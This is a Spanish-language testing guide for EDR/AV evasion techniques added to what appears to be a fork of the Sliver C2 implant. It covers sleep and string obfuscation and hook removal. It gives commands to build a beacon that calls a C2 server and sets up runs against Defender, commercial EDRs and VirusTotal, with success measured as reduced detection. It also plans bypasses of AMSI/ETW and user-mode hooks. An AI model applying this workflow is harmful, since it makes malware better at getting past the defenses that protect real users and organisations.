# Nivel 1 - Testing Guide: EDR/AV Evasion Techniques

## Overview

Este documento describe el protocolo de testing para las técnicas de evasión EDR/AV implementadas en el Nivel 1.

**Técnicas Implementadas:**
1. **Sleep Obfuscation** - Encriptación de heap/stack durante beacon sleep
2. **String Obfuscation** - Ofuscación de strings sensibles (XOR + Base64)
3. **Improved Unhooking** - Restauración selectiva de prologs de funciones

## Configuración del Entorno de Pruebas

### Sistema Operativo
- **OS**: Windows 10/11 Pro (x64)
- **VM**: VMware Workstation / VirtualBox
- **Network**: Isolado (sin conexión externa para tests básicos)

### EDRs / AVs para Testing

**Tier 1 - Baseline (Requerido):**
- Windows Defender (por defecto en Windows)

**Tier 2 - EDRs Comerciales (Opcional pero recomendado):**
- CrowdStrike Falcon (trial/demo)
- SentinelOne (trial/demo)
- Carbon Black (trial/demo)

**Tier 3 - Sandboxes Públicas:**
- ANY.RUN (https://any.run)
- Hybrid Analysis (https://www.hybrid-analysis.com)
- Joe Sandbox (https://www.joesandbox.com)
- VirusTotal (https://www.virustotal.com)

## Procedimiento de Testing

### Fase 1 - Preparación (15-30 minutos)

1. **Compilar Payload con Evasión Nivel 1**
   ```bash
   # En el directorio del repo
   make windows-amd64
   ```

2. **Generar Payload de Beacon**
   ```bash
   # Usar el CLI de Sliver para generar beacon
   ./sliver-client generate beacon --os windows --arch amd64 --format exe --http https://c2-server:8443
   ```

3. **Preparar VM de Testing**
   - Crear snapshot limpio de la VM
   - Asegurar Windows Defender está activo
   - Deshabilitar cualquier otro EDR/AV para baseline
   - Configurar herramienta de logging (Process Monitor, Sysmon, etc.)

### Fase 2 - Baseline Testing (30-45 minutos)

**Objetivo:** Medir tasa de detección sin técnicas de evasión

1. **Ejecutar Payload Baseline**
   - Generar beacon SIN evasión Nivel 1
   - Ejecutar beacon en VM
   - Observar:
     - Alertas de Windows Defender
     - Logs de Event Viewer (Windows Defender → Operational)
     - Capturas de Red (Wireshark)

2. **Documentar Resultados Baseline**
   - Tiempo hasta detección (o si NO es detectado en 5 minutos)
   - Tipo de alerta generada
   - Comportamiento observado
   - Screenshot de alertas

3. **Tabla de Métricas Baseline:**

| Métrica | Valor Baseline | Observaciones |
|----------|---------------|---------------|
| Detección por Defender | Si/No | Tiempo hasta detección |
| Tipo de alerta | Trojan/Backdoor/etc. | Categoría de amenaza |
| Beacon establece C2 | Si/No | Tiempo de primera conexión |
| Memoria escaneada durante sleep | Si/No | Si se detecta sleep pattern |

### Fase 3 - Nivel 1 Testing (30-45 minutos)

**Objetivo:** Validar que las técnicas de evasión reducen la detección

1. **Activar Evasión Nivel 1**
   - Las técnicas ya están implementadas en el código
   - Asegurar que `obfuscationEnabled = true` está activo

2. **Ejecutar Payload con Evasión**
   - Usar el mismo beacon generado en Fase 2
   - Ejecutar beacon en VM
   - Observar:
     - Mejora en tiempo de detección
     - Reducción en alertas
     - Comportamiento del beacon (sleep/heartbeat)

3. **Documentar Resultados Nivel 1**

| Métrica | Valor Baseline | Valor Nivel 1 | Mejora | Observaciones |
|----------|---------------|----------------|--------|---------------|
| Detección por Defender | | | | |
| Detección durante sleep | | | | |
| Tiempo hasta detección | | | | |
| Beacon establece C2 | | | | |
| Alertas de AMSI/ETW | | | | |

4. **Validar Funcionalidad del Beacon**
   - Verificar que el beacon se conecta al C2
   - Ejecutar comandos básicos:
     ```
     ps (list processes)
     execute hostname
     execute whoami
     ```
   - Verificar que los comandos se ejecutan correctamente
   - Probar sleep obfuscation:
     ```
     # El beacon debe hacer sleeps con memoria encriptada
     # Observar logs para ver "Obfuscated sleep" messages
     ```

### Fase 4 - Sandbox Testing (Opcional, 15-30 minutos)

**Objetivo:** Validar que las técnicas evaden detección estática

1. **Subir a ANY.RUN**
   - Visitar https://any.run
   - Subir el beacon EXE
   - Ejecutar análisis completo (30 segundos)
   - Documentar:
     - Número de AVs que detectaron
     - Categoría asignada
     - Comportamiento identificado

2. **Subir a Hybrid Analysis**
   - Visitar https://www.hybrid-analysis.com
   - Subir beacon EXE
   - Ejecutar análisis completo
   - Documentar resultados

3. **Subir a VirusTotal**
   - Visitar https://www.virustotal.com
   - Subir beacon EXE
   - Esperar análisis completo
   - Documentar detección (x/70 AVs)

### Fase 5 - Memory Testing Avanzado (Opcional, 30-60 minutos)

**Objetivo:** Validar que la memoria no es detectable durante sleep

1. **Herramientas Requeridas:**
   - Process Explorer (Sysinternals)
   - VMMap (Sysinternals)
   - ProcDump (Sysinternals)

2. **Testing de Sleep Obfuscation**
   ```
   Pasos:
   1. Ejecutar beacon con Nivel 1
   2. Esperar a que el beacon entre en sleep
   3. Usar VMMap para escanear memoria del proceso
   4. Buscar strings legibles en memoria del beacon
   5. Comparar con baseline (beacon sin evasión)
   ```

3. **Resultado Esperado:**
   - Memoria encriptada no debe tener strings legibles
   - Heap/stack debe aparecer como datos aleatorios
   - No se debe detectar código de shellcode en plaintext

## Criterios de Éxito para Nivel 1

### Métricas Cuantitativas (Objetivos Mínimos)

| Métrica | Baseline | Objetivo Nivel 1 | Criterio de Aprobación |
|----------|-----------|-------------------|------------------------|
| Detección estática | 70-80% | ≤50% | ✅ Pasado |
| Detección durante sleep | 60-70% | ≤45% | ✅ Pasado |
| Tiempo hasta detección | <60s | >90s o no detectado | ✅ Pasado |
| Funcionalidad del beacon | 90% | ≥95% | ✅ Pasado |

### Métricas Cualitativas

- ✅ El beacon establece conexión C2 exitosamente
- ✅ No se generan alertas masivas de comportamiento sospechoso
- ✅ Sleep obfuscation previene memory scanning
- ✅ String obfuscation es efectiva (no DLL names en plaintext)
- ✅ Unhooking elimina hooks de EDR sin crash
- ✅ Comandos básicos se ejecutan correctamente
- ✅ No hay regresión en funcionalidad existente

## Troubleshooting

### Problema 1: Beacon No Se Conecta

**Posibles Causas:**
- Evasión rompe funcionalidad de beacon
- String obfuscation tiene bug en decoding
- Sleep obfuscation causa deadlock

**Soluciones:**
```bash
# Desactivar string obfuscation para testing
# En el código, modificar:
obfuscationEnabled = false

# Desactivar sleep obfuscation para testing
# En el código, modificar:
sleepObfuscationConfig.enabled = false

# Rebuild beacon
make clean && make windows-amd64
```

### Problema 2: Detección Inmediata (<5 segundos)

**Posibles Causas:**
- Firma estática detectada
- Strings de DLL no están completamente ofuscados
- EDR detecta patrones de inyección

**Soluciones:**
- Verificar que string obfuscation está activa
- Revisar strings en el binario:
  ```bash
  strings beacon.exe | grep -i "dll\|ntdll\|kernel32"
  ```
- Si se detectan strings, mejorar obfuscación

### Problema 3: Memory Scanning Aún Detecta Shellcode

**Posibles Causas:**
- Sleep obfuscation no cubre todas las regiones
- EDR usa técnicas de kernel-mode scanning
- Obfuscation key es débil (XOR)

**Soluciones:**
- Mejorar encriptación (usar AES en lugar de XOR)
- Aumentar tamaño de memoria encriptada
- Implementar más técnicas de Nivel 2 (Direct Syscalls)

## Documentación Requerida

### Para Commit a `dev`

1. **Resultados de Testing Local**
   - Tabla comparativa baseline vs Nivel 1
   - Capturas de alertas
   - Logs de Event Viewer

2. **Resultados de Sandbox**
   - Tabla de detección por plataforma
   - Enlaces a reports de análisis
   - Hashes de payloads testeados

3. **Validación Funcional**
   - Lista de comandos ejecutados exitosamente
   - Documentación de cualquier bug o limitación
   - Recomendaciones para Nivel 2

### Archivos a Incluir

- `implant/sliver/evasion/sleep_obfuscation.go`
- `implant/sliver/evasion/string_obfuscation.go`
- `implant/sliver/evasion/evasion_windows.go`
- Capturas de logs y alertas
- Tablas de métricas

## Próximos Pasos (Nivel 2)

Después de aprobación de Nivel 1, proceder con:

1. **Técnicas de Nivel 2:**
   - Direct Syscalls Implementation
   - Module Stomping
   - Enhanced AMSI/ETW Bypass

2. **Métricas Objetivo:**
   - Reducción del 50% en detección de inyección
   - Reducción del 40% en alertas AMSI/ETW
   - Bypass de user-mode hooks en ≥80% de casos

3. **Testing:**
   - Windows Defender + 1 EDR comercial
   - Sandboxes públicas
   - Memory analysis avanzada

---

**Versión:** 1.0
**Fecha:** 2026-02-20
**Nivel:** Nivel 1 - Básico
**Estado:** Implementación Completa, Testing Pendiente
